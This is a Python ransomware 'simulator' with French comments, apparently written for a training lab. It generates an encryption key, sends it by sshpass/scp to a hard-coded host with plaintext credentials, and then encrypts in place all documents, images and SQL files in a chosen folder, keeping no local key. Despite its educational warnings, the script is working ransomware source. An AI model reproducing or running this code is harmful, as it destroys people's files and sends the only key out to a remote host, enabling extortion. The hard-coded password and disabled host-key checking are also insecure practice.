#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - VERSION AVEC MENU INTERACTIF
import os
import sys
import subprocess
from cryptography.fernet import Fernet
from pathlib import Path

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
SSH_PASSWORD = "doranco"  # Mot de passe en clair (à utiliser uniquement en environnement de test)
REMOTE_DIR = "/home/doranco/cle_dechiffrement"
KEY_FILE = "decryption_key.key"

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.target_exts = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.sql'}
        
    def clear_screen(self):
        """Efface l'écran du terminal"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        """Affiche une bannière stylisée"""
        self.clear_screen()
        print("""
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
        """)
        print("=== SIMULATEUR ÉDUCATIF - MENU PRINCIPAL ===")
        print("⚠️ À utiliser uniquement en environnement de test ⚠️\n")
        print(f"🔐 Compte SSH utilisé: {SSH_USER}@{SSH_SERVER}")
        print(f"🔑 Mot de passe SSH: {SSH_PASSWORD}\n")

    def generate_key(self):
        """Génère une clé de chiffrement"""
        print("\n🔑 Génération de la clé...")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"✅ Clé générée: {self.key.decode()[:12]}...")
        return True

    def transfer_key_ssh(self):
        """Transfère la clé via SSH natif"""
        if not self.key:
            print("\n❌ Aucune clé générée!")
            return False

        try:
            print("\n🔄 Transfert de la clé...")
            
            # Crée un fichier temporaire
            with open(KEY_FILE, 'wb') as f:
                f.write(self.key)
            
            # Commande SSH pour créer le répertoire distant
            ssh_cmd = f'sshpass -p {SSH_PASSWORD} ssh {SSH_USER}@{SSH_SERVER} "mkdir -p {REMOTE_DIR}"'
            subprocess.run(ssh_cmd, shell=True, check=True)
            
            # Commande SCP pour transférer la clé
            scp_cmd = f'sshpass -p {SSH_PASSWORD} scp -o StrictHostKeyChecking=no {KEY_FILE} {SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/{KEY_FILE}'
            subprocess.run(scp_cmd, shell=True, check=True)
            
            # Nettoyage
            os.remove(KEY_FILE)
            
            print(f"\n📤 Clé transférée avec succès vers :")
            print(f"   Serveur: {SSH_SERVER}")
            print(f"   Utilisateur: {SSH_USER}")
            print(f"   Chemin: {REMOTE_DIR}/{KEY_FILE}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"\n❌ Échec du transfert SSH: {e}")
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier"""
        try:
            if Path(filepath).suffix.lower() not in self.target_exts:
                return False

            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            
            return True
        except Exception as e:
            print(f"⚠️ Erreur sur {filepath}: {e}")
            return False

    def encrypt_directory(self, path='.'):
        """Chiffre un dossier"""
        if not os.path.exists(path):
            print("\n❌ Le dossier spécifié n'existe pas!")
            return

        encrypted = errors = 0
        print(f"\n🔒 Début du chiffrement de: {path}")
        
        for root, _, files in os.walk(path):
            for file in files:
                if Path(file).suffix.lower() in self.target_exts:
                    if self.encrypt_file(os.path.join(root, file)):
                        encrypted += 1
                    else:
                        errors += 1
        
        print(f"\n✅ Chiffrement terminé!")
        print(f"   Fichiers chiffrés: {encrypted}")
        print(f"   Erreurs: {errors}")

    def show_menu(self):
        """Affiche le menu interactif"""
        while True:
            self.show_banner()
            print("Options disponibles:")
            print("1. Générer une nouvelle clé")
            print("2. Transférer la clé actuelle")
            print("3. Chiffrer un dossier")
            print("4. Tout faire (mode automatique)")
            print("0. Quitter\n")
            
            choice = input("Votre choix (0-4): ")
            
            if choice == "1":
                self.generate_key()
            elif choice == "2":
                if self.key:
                    self.transfer_key_ssh()
                else:
                    print("\n❌ Vous devez d'abord générer une clé!")
            elif choice == "3":
                if self.key:
                    path = input("\nEntrez le chemin du dossier à chiffrer: ")
                    self.encrypt_directory(path)
                else:
                    print("\n❌ Vous devez d'abord générer une clé!")
            elif choice == "4":
                print("\n🚀 Mode automatique activé...")
                if self.generate_key():
                    if self.transfer_key_ssh():
                        path = input("\nEntrez le chemin du dossier à chiffrer: ")
                        self.encrypt_directory(path)
            elif choice == "0":
                print("\n👋 Au revoir!")
                sys.exit(0)
            else:
                print("\n❌ Option invalide!")
            
            input("\nAppuyez sur Entrée pour continuer...")

if __name__ == '__main__':
    try:
        # Vérifie que sshpass est installé pour l'authentification par mot de passe
        subprocess.run(['sshpass', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Vérifie que SSH est installé
        subprocess.run(['ssh', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        
        sim = RansomwareSimulator()
        sim.show_menu()
        
    except FileNotFoundError:
        print("\n❌ Erreur: sshpass et OpenSSH doivent être installés")
        print("Installez-les avec: sudo apt install sshpass openssh-client")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n⏹️ Opération annulée par l'utilisateur")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Erreur inattendue: {e}")
        sys.exit(1)